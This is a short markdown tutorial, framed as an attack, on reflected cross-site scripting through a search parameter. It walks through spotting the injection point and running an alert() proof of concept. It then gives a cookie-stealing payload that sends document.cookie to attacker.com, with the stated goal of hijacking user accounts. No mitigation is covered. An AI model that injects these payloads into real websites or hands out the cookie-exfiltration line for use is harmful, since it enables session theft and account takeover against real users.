# ⚔️ XSS Attack

## 🧠 Scenario
A search box reflects user input:

```
https://example.com/search?q=input
```

---

## 🚀 Step 1: Identify Injection Point
- Input is displayed in page without filtering

---

## 🚀 Step 2: Inject Payload

```html
<script>alert('XSS')</script>
```

---

## 🚀 Step 3: Execution

- Script executes in victim’s browser
- Alert popup confirms vulnerability

---

## 🧪 Example

Input:
```
<script>alert('Hacked')</script>
```

Output:
- Popup appears in browser

---

## 🔥 Advanced Attack

Steal cookies:

```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

---

## 🧠 Attacker Goal
- Steal session cookies
- Hijack user accounts
